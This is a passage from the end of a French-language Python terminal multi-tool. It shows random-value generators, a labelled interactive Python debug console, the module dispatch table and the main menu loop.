            n = ask_int("Nombre d'octets : ", 32)
            print("  " + secrets_hex(n))
        elif c == 4:
            n = ask_int("Longueur : ", 32)
            print("  " + base64.urlsafe_b64encode(os.urandom(n)).decode().rstrip("="))
        elif c == 5:
            faces = ask_int("Faces du de : ", 6)
            print("  Resultat : " + str(random.randint(1, faces)))
        elif c == 6:
            print("  Resultat : " + random.choice(["PILE", "FACE"]))
        elif c == 7:
            entree = ask("Liste separes par des virgules : ", "a,b,c")
            elements = [e.strip() for e in entree.split(",") if e.strip()]
            print("  Choix : " + random.choice(elements))
        elif c == 8:
            texte = lire_multiligne("Colle les lignes puis valide avec une ligne vide :")
            lignes = [l for l in texte.splitlines() if l.strip()]
            random.shuffle(lignes)
            print()
            print("\n".join(lignes))
        else:
            erreur("Choix invalide.")
    pause()


def secrets_hex(n):
    """Octets aleatoires cryptographiquement surs en hex."""
    return os.urandom(n).hex()


def mod_30():  # Debug Console
    outil_titre("Debug Console")
    info("Console Python dans le process. Commandes : help, clear, exit")
    info("Contexte expose : os, sys, json, re, math, hashlib, base64, subprocess, urllib, datetime, socket")
    import contextlib
    import code as _code

    contexte = {
        "os": os, "sys": sys, "json": json, "re": re, "math": math,
        "hashlib": hashlib, "base64": base64, "subprocess": subprocess,
        "datetime": datetime, "socket": socket, "urllib": urllib,
        "random": random, "time": time, "platform": platform,
    }

    try:
        while True:
            try:
                ligne = input(f"{CYAN}py{RESET}>{RED}>{RESET} ")
            except EOFError:
                break
            if not ligne.strip():
                continue
            if ligne.strip().lower() in ("exit", "quit"):
                break
            if ligne.strip().lower() == "help":
                print("  Tape du code Python directement. Variables persistentes entre les commandes.")
                print("  ex: os.listdir('.') | sum(range(10)) | __contextes__ pour voir l'env")
                continue
            if ligne.strip().lower() == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue
            buf = io.StringIO()
            try:
                with contextlib.redirect_stdout(buf):
                    val = eval(compile(ligne, "<console>", "eval"), contexte)
                if val is not None:
                    print(repr(val))
            except SyntaxError:
                try:
                    with contextlib.redirect_stdout(buf):
                        exec(compile(ligne, "<console>", "exec"), contexte)
                except Exception as e:
                    erreur(f"{type(e).__name__}: {e}")
            except Exception as e:
                erreur(f"{type(e).__name__}: {e}")
            sortie = buf.getvalue()
            if sortie:
                print(sortie, end="")
            contexte["__dernier"] = val if "val" in dir() else None
    except KeyboardInterrupt:
        pass
    pause()


# ============================================================================
#  DISPATCH DES MODULES (page 1 : 1-30)
# ============================================================================

MODULES = {
    "1": mod_01, "2": mod_02, "3": mod_03, "4": mod_04, "5": mod_05,
    "6": mod_06, "7": mod_07, "8": mod_08, "9": mod_09, "10": mod_10,
    "11": mod_11, "12": mod_12, "13": mod_13, "14": mod_14, "15": mod_15,
    "16": mod_16, "17": mod_17, "18": mod_18, "19": mod_19, "20": mod_20,
    "21": mod_21, "22": mod_22, "23": mod_23, "24": mod_24, "25": mod_25,
    "26": mod_26, "27": mod_27, "28": mod_28, "29": mod_29, "30": mod_30,
}

# Numeros affiches sur la page 2 (modules 31-60, en cours pour demain)
PAGE2_NUMEROS = set(str(n) for n in range(31, 61))


def _pause_safe():
    try:
        pause()
    except EOFError:
        print()


def page2_bientot(numero):
    """Page 2 (modules 31-60) : developpement en cours, dispo demain."""
    nom = tout_le_menu_en_dict(COLUMNS_PAGE_2).get(numero, "Module")
    outil_titre(nom)
    warn(f"Module {numero} ({nom}) : page 2 en cours de developpement.")
    info("Elle sera fonctionnelle demain - reviens !")
    _pause_safe()


# ============================================================================
#  BOUCLE PRINCIPALE (identique a la v1 : logo, pages N/B, quitter Q)
# ============================================================================

def main():
    page = 1
    try:
        afficher_loading()
    except KeyboardInterrupt:
        print()
    while True:
        try:
            os.system("cls" if os.name == "nt" else "clear")
            afficher_logo()
            afficher_entete(page)
            afficher_menu(COLUMNS_PAGE_1 if page == 1 else COLUMNS_PAGE_2)
            choix = afficher_prompt().strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not choix:
            continue
        if choix in ("q", "quit", "exit"):
            break
        if choix == "n":
            page = min(2, page + 1)
            continue
        if choix == "b":
            page = max(1, page - 1)
            continue
        if choix.isdigit():
            numero = str(int(choix))
            if numero in MODULES:
                try:
                    MODULES[numero]()
                except KeyboardInterrupt:
                    print()
                    warn("Interrompu.")
                    _pause_safe()
                except Exception as e:
                    erreur(f"Erreur module {numero} : {type(e).__name__}: {e}")
                    _pause_safe()
                continue
            if numero in PAGE2_NUMEROS:
                page2_bientot(numero)
                continue
        erreur("Choix invalide.")
        _pause_safe()


if __name__ == "__main__":
    main()
